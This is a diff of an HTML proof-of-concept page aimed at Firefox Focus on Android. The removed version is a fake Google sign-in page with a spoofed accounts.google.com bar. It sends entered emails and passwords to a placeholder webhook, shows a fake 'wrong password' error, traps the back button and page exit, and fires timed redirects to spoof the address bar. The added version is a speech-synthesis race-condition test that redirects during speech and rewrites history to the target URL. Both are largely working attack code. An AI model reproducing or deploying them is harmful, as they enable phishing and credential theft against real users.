@@ -3,267 +3,264 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>Google Sign In</title>
+<title>Speech Test</title>
 <style>
   *{margin:0;padding:0;box-sizing:border-box}
-  body{
-    font-family:-apple-system,Arial,sans-serif;
-    background:#fff;
-    min-height:100vh;
-    display:flex;
-    align-items:center;
-    justify-content:center;
+  body {
+    font-family: -apple-system, Arial, sans-serif;
+    background: #1a1a2e;
+    color: #fff;
+    text-align: center;
+    padding: 40px 20px;
+    min-height: 100vh;
   }
-  .c{width:90%;max-width:400px;padding:20px;text-align:center}
-  .bar{
-    background:#f1f3f4;border-radius:20px;
-    padding:6px 14px;margin-bottom:20px;
-    font-size:12px;color:#5f6368;
-    display:flex;align-items:center;gap:6px
+  h2 { margin-bottom: 8px; font-size: 20px; }
+  p.sub { color: #888; font-size: 13px; margin-bottom: 24px; }
+  button {
+    padding: 18px 36px;
+    font-size: 18px;
+    background: #e94560;
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    cursor: pointer;
+    width: 100%;
+    max-width: 320px;
   }
-  h1{font-size:22px;color:#202124;margin-bottom:4px}
-  .sub{color:#5f6368;font-size:13px;margin-bottom:20px}
-  input{
-    width:100%;padding:12px;border:1px solid #dadce0;
-    border-radius:4px;font-size:16px;margin-bottom:10px
+  button:active { background: #c23152; }
+  button:disabled { background: #444; cursor: default; }
+  #log {
+    margin-top: 24px;
+    background: #16213e;
+    padding: 16px;
+    border-radius: 8px;
+    font-family: monospace;
+    font-size: 12px;
+    text-align: left;
+    max-height: 60vh;
+    overflow-y: auto;
   }
-  button{
-    width:100%;padding:12px;background:#1a73e8;
-    color:#fff;border:none;border-radius:20px;
-    font-size:16px;font-weight:500;cursor:pointer
+  .green { color: #00b894; }
+  .yellow { color: #fdcb6e; }
+  .red { color: #e94560; }
+  .white { color: #dfe6e9; }
+  .info-box {
+    background: #16213e;
+    border: 1px solid #2d3436;
+    border-radius: 8px;
+    padding: 12px;
+    margin-bottom: 20px;
+    font-size: 12px;
+    text-align: left;
   }
-  #msg{color:#d93025;font-size:12px;margin-top:8px;min-height:18px}
-  
-  /* Loading overlay */
-  #load{
-    display:none;position:fixed;top:0;left:0;right:0;bottom:0;
-    background:rgba(0,0,0,0.5);z-index:9999;
-    align-items:center;justify-content:center;color:#fff;font-size:18px
-  }
+  .info-box .label { color: #636e72; }
+  .info-box .value { color: #00b894; }
 </style>
 </head>
 <body>
 
-<div class="c" id="mainPage">
-  <div class="bar"><span>🔒</span><span>accounts.google.com</span></div>
-  <h1>Sign in</h1>
-  <p class="sub">to continue to Gmail</p>
-  <input id="email" placeholder="Email or phone" autocomplete="off">
-  <input id="pass" type="password" placeholder="Password">
-  <button id="btn">Next</button>
-  <div id="msg"></div>
+<h2>🔊 SpeechSynthesis Address Bar Test</h2>
+<p class="sub">Firefox Focus 151 • Android 15 • Race Condition PoC</p>
+
+<div class="info-box">
+  <div><span class="label">UA: </span><span class="value" id="uaTxt">...</span></div>
+  <div><span class="label">Speech API: </span><span class="value" id="apiTxt">...</span></div>
+  <div><span class="label">Voices: </span><span class="value" id="voiceTxt">...</span></div>
+  <div><span class="label">Tests run: </span><span class="value" id="testCount">0</span></div>
 </div>
 
-<div id="load">⏳ Redirecting...</div>
+<button id="testBtn">🔊 Speak & Redirect</button>
 
-<!-- ============================================ -->
-<!-- VECTOR 1: TRACKER BLOCKER ABUSE -->
-<!-- ============================================ -->
-<script src="https://www.google-analytics.com/analytics.js" onerror="fire(0)"></script>
-<script src="https://connect.facebook.net/en_US/fbevents.js" onerror="fire(0)"></script>
-<img src="https://doubleclick.net/p.gif" onerror="fire(0)" style="display:none">
-
-<!-- ============================================ -->
-<!-- VECTOR 2: FAKE TRACKER SPAM -->
-<!-- ============================================ -->
-<script>
-// Bikin fake tracker image buat trigger onerror berkali-kali
-const trackers = [
-  'https://ad.doubleclick.net/ddm/trackimp/',
-  'https://www.googleadservices.com/pagead/conversion/',
-  'https://ib.adnxs.com/px?t=1',
-  'https://gum.criteo.com/sync?c=1',
-  'https://pixel.adsafeprotected.com/',
-  'https://match.adsrvr.org/track/',
-  'https://pixel.rubiconproject.com/',
-  'https://ads.yahoo.com/pixel/',
-  'https://analytics.twitter.com/i/adsct',
-  'https://analytics.tiktok.com/i18n/pixel/',
-  'https://snap.licdn.com/li.lms-analytics/',
-  'https://static.hotjar.com/c/hotjar-',
-];
-
-for(let i = 0; i < trackers.length; i++) {
-  const img = new Image();
-  img.src = trackers[i] + Math.random();
-  img.onerror = () => fire(i * 10);
-}
-</script>
+<div id="log">
+  <div class="green">[Ready] Click button to test</div>
+</div>
 
 <script>
 // ============================================
-// KONFIGURASI
+// CONFIG
 // ============================================
-const TARGET = 'https://accounts.google.com';
-const DELAYS = [0, 30, 60, 100, 150, 200, 300, 500, 800, 1200];
-let fired = 0;
+const TARGET = 'https://www.google.com';
+const logEl = document.getElementById('log');
+let testsRun = 0;
+let speechStartTime = 0;
+let redirectFired = false;
 
-// ============================================
-// CORE EXPLOIT: MULTI-VECTOR FIRE
-// ============================================
-function fire(offset) {
-  fired++;
-  
-  // Pilih delay berdasarkan offset
-  const delay = DELAYS[fired % DELAYS.length] + offset;
-  
-  setTimeout(() => {
-    attemptRedirect();
-  }, delay);
+function log(msg, color) {
+  color = color || 'green';
+  var div = document.createElement('div');
+  div.className = color;
+  var ts = new Date().toTimeString().split(' ')[0];
+  div.textContent = '[' + ts + '] ' + msg;
+  logEl.prepend(div);
 }
 
-function attemptRedirect() {
-  // ========================================
-  // VECTOR A: SpeechSynthesis (DENGAN SUARA!)
-  // ========================================
-  if ('speechSynthesis' in window) {
-    try {
-      const u = new SpeechSynthesisUtterance('');
-      u.volume = 0; // Silent - biar ga ketahuan
-      u.rate = 2;   // Cepet
-      speechSynthesis.speak(u);
-    } catch(e) {}
+function updateInfo(id, val) {
+  var el = document.getElementById(id);
+  if (el) el.textContent = val;
+}
+
+// ============================================
+// BROWSER INFO
+// ============================================
+window.addEventListener('load', function() {
+  var ua = navigator.userAgent;
+  updateInfo('uaTxt', ua.substring(0, 80));
+  updateInfo('apiTxt', ('speechSynthesis' in window) ? 'SUPPORTED' : 'NOT SUPPORTED');
+
+  var loadVoices = function() {
+    var v = speechSynthesis.getVoices();
+    updateInfo('voiceTxt', v.length + ' voices');
+    var enVoices = v.filter(function(x) { return x.lang.startsWith('en'); });
+    if (enVoices.length > 0) {
+      log('English voices: ' + enVoices.map(function(x){return x.name}).join(', '), 'white');
+    }
+  };
+
+  loadVoices();
+  speechSynthesis.onvoiceschanged = loadVoices;
+
+  // Android 15 / FF Focus specific info
+  log('Platform: ' + navigator.platform, 'white');
+  log('Cookies enabled: ' + navigator.cookieEnabled, 'white');
+  log('JS engine hints: ' + (typeof WebAssembly !== 'undefined' ? 'WASM yes' : 'WASM no'), 'white');
+});
+
+// ============================================
+// CORE TEST
+// ============================================
+document.getElementById('testBtn').addEventListener('click', function() {
+  var btn = this;
+  btn.disabled = true;
+  testsRun++;
+  updateInfo('testCount', testsRun);
+  redirectFired = false;
+
+  log('=== TEST #' + testsRun + ' ===', 'white');
+  log('Starting race condition test...', 'yellow');
+
+  // Cancel any ongoing speech
+  speechSynthesis.cancel();
+
+  // Load voices
+  var voices = speechSynthesis.getVoices();
+  if (!voices.length) {
+    log('Waiting for voices...', 'yellow');
+    speechSynthesis.onvoiceschanged = function() {
+      voices = speechSynthesis.getVoices();
+      runTest(voices, btn);
+    };
+    // Timeout fallback
+    setTimeout(function() {
+      voices = speechSynthesis.getVoices();
+      if (voices.length > 0) runTest(voices, btn);
+      else {
+        log('No voices available, using default', 'yellow');
+        runTest([], btn);
+      }
+    }, 2000);
+  } else {
+    runTest(voices, btn);
   }
-  
-  // ========================================
-  // VECTOR B: Vibration (DIAM-DIAM)
-  // ========================================
-  if (navigator.vibrate) {
-    try {
-      // Getaran pendek, ga kerasa
-      navigator.vibrate([5]);
-    } catch(e) {}
-  }
-  
-  // ========================================
-  // VECTOR C: RequestFullscreen (ERROR = RACE CONDITION)
-  // ========================================
-  if (document.documentElement.requestFullscreen) {
-    document.documentElement.requestFullscreen().catch(() => {
-      // Fullscreen ditolak = UI thread sibuk = PERFECT TIMING
-      window.location.href = TARGET;
+});
+
+function runTest(voices, btn) {
+  var voice = voices.find(function(v) { return v.lang.startsWith('en'); }) || voices[0] || null;
+  log('Voice: ' + (voice ? voice.name : 'default'), 'green');
+
+  // ==========================================
+  // STRATEGY 1: Redirect on speechstart
+  // ==========================================
+  var utter1 = new SpeechSynthesisUtterance('Security alert. Redirecting.');
+  utter1.lang = 'en-US';
+  utter1.rate = 1.5;
+  utter1.volume = 0.5;
+  if (voice) utter1.voice = voice;
+
+  utter1.onstart = function() {
+    speechStartTime = performance.now();
+    log('Speech STARTED - race window open!', 'yellow');
+
+    // Fire redirect at multiple delays to find the sweet spot
+    var delays = [0, 5, 10, 15, 20, 30, 50, 75, 100, 150, 200];
+    delays.forEach(function(d) {
+      setTimeout(function() {
+        if (!redirectFired) {
+          redirectFired = true;
+          var elapsed = Math.round(performance.now() - speechStartTime);
+          log('>>> REDIRECT @ +' + d + 'ms (speech elapsed: ' + elapsed + 'ms)', 'red');
+          window.location.href = TARGET;
+        }
+      }, d);
     });
+  };
+
+  utter1.onend = function() {
+    var elapsed = Math.round(performance.now() - speechStartTime);
+    log('Speech ended @ ' + elapsed + 'ms', 'green');
+    if (!redirectFired) {
+      redirectFired = true;
+      log('>>> REDIRECT (fallback onend)', 'red');
+      window.location.href = TARGET;
+    }
+  };
+
+  utter1.onerror = function(e) {
+    log('Speech error: ' + e.error, 'red');
+    if (!redirectFired) {
+      redirectFired = true;
+      log('>>> REDIRECT (fallback onerror)', 'red');
+      window.location.href = TARGET;
+    }
+  };
+
+  // ==========================================
+  // STRATEGY 2: History manipulation before speech
+  // ==========================================
+  try {
+    history.replaceState({t: Date.now()}, '', TARGET);
+    log('history.replaceState to target URL done', 'white');
+  } catch(e) {
+    log('replaceState failed: ' + e.message, 'red');
   }
-  
-  // ========================================
-  // VECTOR D: Orientation Lock
-  // ========================================
-  if (screen.orientation && screen.orientation.lock) {
-    screen.orientation.lock('portrait').catch(() => {});
-  }
-  
-  // ========================================
-  // VECTOR E: DIRECT REDIRECT
-  // ========================================
-  window.location.href = TARGET;
-  
-  // Backup redirect 50ms kemudian
-  setTimeout(() => {
-    window.location.replace(TARGET);
-  }, 50);
-  
-  // Backup lagi 100ms kemudian
-  setTimeout(() => {
-    if (document.hidden) return;
-    document.getElementById('load').style.display = 'flex';
-    window.location.href = TARGET;
+
+  // ==========================================
+  // STRATEGY 3: Warm-up trick for FF Focus
+  // ==========================================
+  try {
+    var warm = new SpeechSynthesisUtterance('');
+    warm.volume = 0;
+    warm.rate = 3;
+    speechSynthesis.speak(warm);
+    speechSynthesis.cancel();
+    log('Warm-up done', 'white');
+  } catch(e) {}
+
+  // Small delay then fire main utterance
+  setTimeout(function() {
+    try {
+      speechSynthesis.speak(utter1);
+      log('speak() called', 'green');
+
+      // FF Focus hack: pause/resume kickstart
+      setTimeout(function() {
+        try {
+          speechSynthesis.pause();
+          speechSynthesis.resume();
+          log('pause/resume kickstart', 'white');
+        } catch(e) {}
+      }, 30);
+
+    } catch(e) {
+      log('speak() exception: ' + e.message, 'red');
+      if (!redirectFired) {
+        redirectFired = true;
+        window.location.href = TARGET;
+      }
+    }
   }, 100);
-}
 
-// ============================================
-// FALLBACK: User Interaction Trigger
-// ============================================
-document.addEventListener('click', () => {
-  if (fired < 3) {
-    setTimeout(() => fire(0), 200);
-  }
-}, { once: true });
-
-document.addEventListener('touchstart', () => {
-  if (fired < 3) {
-    setTimeout(() => fire(0), 200);
-  }
-}, { once: true });
-
-// ============================================
-// PERSISTENCE & TRAPS
-// ============================================
-
-// Back button trap
-history.replaceState({trap:1}, '', location.href);
-history.pushState({trap:2}, '', '/verify');
-history.pushState({trap:3}, '', '/auth');
-
-window.addEventListener('popstate', () => {
-  // User pencet back! Tampilin ulang phishing
-  document.getElementById('msg').textContent = '⚠️ Session expired. Please login.';
-  
-  // Push state lagi biar ga bisa keluar
-  history.pushState({trap:4}, '', '/re-auth');
-  
-  // Auto-redirect ke Google lagi setelah delay
-  setTimeout(() => {
-    window.location.href = TARGET;
-  }, 5000);
-});
-
-// Before unload trap
-window.addEventListener('beforeunload', (e) => {
-  e.preventDefault();
-  e.returnValue = '';
-});
-
-// Visibility change - user balik ke tab
-document.addEventListener('visibilitychange', () => {
-  if (!document.hidden) {
-    document.getElementById('msg').textContent = '⚠️ Session expired. Please login again.';
-  }
-});
-
-// ============================================
-// CREDENTIAL HARVEST
-// ============================================
-document.getElementById('btn').addEventListener('click', () => {
-  const e = document.getElementById('email').value;
-  const p = document.getElementById('pass').value;
-  
-  if (!e || !p) {
-    document.getElementById('msg').textContent = 'Please fill all fields';
-    return;
-  }
-  
-  // Kirim ke webhook
-  fetch('https://YOUR-WEBHOOK.com/log?' + new URLSearchParams({e, p}), {
-    mode: 'no-cors'
-  });
-  
-  // Fake error
-  document.getElementById('msg').textContent = '❌ Wrong password. Try again.';
-  document.getElementById('pass').value = '';
-  
-  // Redirect ke Google lagi
-  setTimeout(() => {
-    window.location.href = TARGET;
-  }, 1500);
-});
-
-// ============================================
-// AUTO TRIGGER SAAT LOAD
-// ============================================
-window.addEventListener('load', () => {
-  // Trigger bertahap
-  setTimeout(() => fire(0), 500);
-  setTimeout(() => fire(50), 1500);
-  setTimeout(() => fire(100), 3000);
-  
-  // Spam tracker images tambahan
-  for (let i = 0; i < 20; i++) {
-    const img = new Image();
-    img.src = 'https://ad.doubleclick.net/ddm/trackimp/N' + Math.random() + i;
-    img.onerror = () => fire(Math.floor(Math.random() * 200));
-  }
-  
-  console.log('[PoC] Multi-vector attack armed. Trackers: ' + trackers.length);
+  // Safety: re-enable button after 5s
+  setTimeout(function() { btn.disabled = false; }, 5000);
 });
 </script>
 
